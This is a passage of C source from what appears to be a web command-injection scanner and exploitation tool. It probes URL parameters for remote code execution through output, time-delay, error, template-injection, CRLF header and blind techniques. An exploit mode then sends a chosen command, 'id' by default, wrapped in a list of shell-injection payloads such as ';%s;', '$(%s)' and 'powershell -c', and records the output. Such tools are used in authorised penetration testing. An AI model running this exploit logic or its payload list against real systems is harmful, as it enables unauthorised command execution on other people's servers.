                    strcpy(results[result_count].method, args.method);
                    strcpy(results[result_count].technique, "php-specific");
                    results[result_count].confidence = 0.90;
                    strcpy(results[result_count].engine, "c");
                    strcpy(results[result_count].output, "PHP-specific RCE confirmed");
                    result_count++; vuln_found = 1;
                }
            }

            // Output-based (all wrappers + WAF bypasses)
            if (!vuln_found && test_output(&args, params[p].name)) {
                memset(&results[result_count], 0, sizeof(Result));
                results[result_count].vulnerable = 1;
                strcpy(results[result_count].url, args.url);
                strcpy(results[result_count].parameter, params[p].name);
                strcpy(results[result_count].method, args.method);
                strcpy(results[result_count].technique, "output-based");
                results[result_count].confidence = 0.95;
                strcpy(results[result_count].engine, "c");
                strcpy(results[result_count].output, "Output-based RCE: marker reflected");
                result_count++; vuln_found = 1;
            }

            // Shell variant output
            if (!vuln_found && test_shell_variants(&args, params[p].name)) {
                memset(&results[result_count], 0, sizeof(Result));
                results[result_count].vulnerable = 1;
                strcpy(results[result_count].url, args.url);
                strcpy(results[result_count].parameter, params[p].name);
                strcpy(results[result_count].method, args.method);
                strcpy(results[result_count].technique, "shell-variant");
                results[result_count].confidence = 0.90;
                strcpy(results[result_count].engine, "c");
                strcpy(results[result_count].output, "Shell variant RCE: interpreter output reflected");
                result_count++; vuln_found = 1;
            }

            // Time-based (multiple sleep durations)
            if (!vuln_found) {
                int time_sleeps[] = {3, 5, 7, 10, 15};
                for (int ti = 0; ti < 5 && !vuln_found; ti++) {
                    if (test_time(&args, params[p].name, time_sleeps[ti])) {
                        memset(&results[result_count], 0, sizeof(Result));
                        results[result_count].vulnerable = 1;
                        strcpy(results[result_count].url, args.url);
                        strcpy(results[result_count].parameter, params[p].name);
                        strcpy(results[result_count].method, args.method);
                        strcpy(results[result_count].technique, "time-based");
                        results[result_count].confidence = 0.85;
                        strcpy(results[result_count].engine, "c");
                        snprintf(results[result_count].output, sizeof(results[result_count].output),
                            "Time-based RCE: sleep %ds delay detected", time_sleeps[ti]);
                        result_count++; vuln_found = 1;
                    }
                }
                // Interpreter-based sleeps
                for (int si = 0; interp_sleeps[si] && !vuln_found; si++) {
                    long long start, elapsed;
                    start = get_time_ms();
                    char resp[BUFLEN];
                    int ok = send_payload_ex(&args, params[p].name, interp_sleeps[si], resp, sizeof(resp));
                    elapsed = get_time_ms() - start;
                    if (ok && elapsed >= 3500) {
                        memset(&results[result_count], 0, sizeof(Result));
                        results[result_count].vulnerable = 1;
                        strcpy(results[result_count].url, args.url);
                        strcpy(results[result_count].parameter, params[p].name);
                        strcpy(results[result_count].method, args.method);
                        strcpy(results[result_count].technique, "time-based");
                        results[result_count].confidence = 0.80;
                        strcpy(results[result_count].engine, "c");
                        snprintf(results[result_count].output, sizeof(results[result_count].output),
                            "Time-based RCE: interpreter sleep (elapsed: %lldms)", elapsed);
                        result_count++; vuln_found = 1;
                    }
                }
            }

            // Error-based
            if (!vuln_found && test_error(&args, params[p].name)) {
                memset(&results[result_count], 0, sizeof(Result));
                results[result_count].vulnerable = 1;
                strcpy(results[result_count].url, args.url);
                strcpy(results[result_count].parameter, params[p].name);
                strcpy(results[result_count].method, args.method);
                strcpy(results[result_count].technique, "error-based");
                results[result_count].confidence = 0.65;
                strcpy(results[result_count].engine, "c");
                strcpy(results[result_count].output, "Error-based RCE: command error detected");
                result_count++; vuln_found = 1;
            }

            // SSTI
            if (!vuln_found && test_ssti(&args, params[p].name)) {
                memset(&results[result_count], 0, sizeof(Result));
                results[result_count].vulnerable = 1;
                strcpy(results[result_count].url, args.url);
                strcpy(results[result_count].parameter, params[p].name);
                strcpy(results[result_count].method, args.method);
                strcpy(results[result_count].technique, "ssti");
                results[result_count].confidence = 0.80;
                strcpy(results[result_count].engine, "c");
                strcpy(results[result_count].output, "SSTI detected: template injection confirmed");
                result_count++; vuln_found = 1;
            }

            // Header injection
            if (!vuln_found && test_header_injection(&args, params[p].name)) {
                memset(&results[result_count], 0, sizeof(Result));
                results[result_count].vulnerable = 1;
                strcpy(results[result_count].url, args.url);
                strcpy(results[result_count].parameter, params[p].name);
                strcpy(results[result_count].method, args.method);
                strcpy(results[result_count].technique, "header-injection");
                results[result_count].confidence = 0.75;
                strcpy(results[result_count].engine, "c");
                strcpy(results[result_count].output, "Header injection RCE: CRLF injection confirmed");
                result_count++; vuln_found = 1;
            }

            // Blind boolean
            if (!vuln_found && args.blind && test_blind(&args, params[p].name)) {
                memset(&results[result_count], 0, sizeof(Result));
                results[result_count].vulnerable = 1;
                strcpy(results[result_count].url, args.url);
                strcpy(results[result_count].parameter, params[p].name);
                strcpy(results[result_count].method, args.method);
                strcpy(results[result_count].technique, "blind-boolean");
                results[result_count].confidence = 0.90;
                strcpy(results[result_count].engine, "c");
                strcpy(results[result_count].output, "Blind boolean RCE: conditional execution verified");
                result_count++; vuln_found = 1;
            }

            // OOB
            if (strlen(args.oob) > 0 && !vuln_found) {
                test_oob(&args, params[p].name);
            }
        }

        if ((args.exploit || strlen(args.cmd) > 0) && !vuln_found) {
            char *cmd = strlen(args.cmd) > 0 ? args.cmd : "id";
            char payload[2048];
            char response[BUFLEN];

            const char *wrappers[] = {
                ";%s;", "|%s|", "`%s`", "$(%s)", "&%s&",
                "';%s;'", "\";%s;\"", "${%s}", "%%0a%s%%0a",
                "%%0d%%0a%s%%0d%%0a", "\\n%s\\n", "\\r\\n%s\\r\\n",
                "&&%s&&", "||%s||",
                "&%s #", "|%s #", ";%s #",
                ";%s %%23", ";%s <!--",
                "&cmd /c %s &", ";powershell -c \"%s\" ;",
                "|cmd /c %s |", "|powershell -c \"%s\" |",
                NULL
            };
            for (int w = 0; wrappers[w]; w++) {
                snprintf(payload, sizeof(payload), wrappers[w], cmd);
                if (send_payload_ex(&args, params[p].name, payload, response, sizeof(response))) {
                    memset(&results[result_count], 0, sizeof(Result));
                    results[result_count].vulnerable = 1;
                    strcpy(results[result_count].url, args.url);
                    strcpy(results[result_count].parameter, params[p].name);
                    strcpy(results[result_count].method, args.method);
                    strcpy(results[result_count].payload, payload);
                    strcpy(results[result_count].command, cmd);
                    strncpy(results[result_count].output, response, sizeof(results[result_count].output)-1);
                    results[result_count].confidence = 1.0;
                    strcpy(results[result_count].engine, "c");
                    strcpy(results[result_count].technique, "exploit");
                    result_count++;
                    break;
                }
            }
        }
    }

    if (result_count == 0) {
        memset(&results[0], 0, sizeof(Result));
        results[0].vulnerable = 0;
        strcpy(results[0].url, args.url);
        strcpy(results[0].method, args.method);
        strcpy(results[0].engine, "c");
        result_count = 1;
    }

    if (args.json) {
        print_json(results, result_count);
    } else {
        print_plain(results, result_count);
    }

    free(params);
    free(results);
    return 0;
}
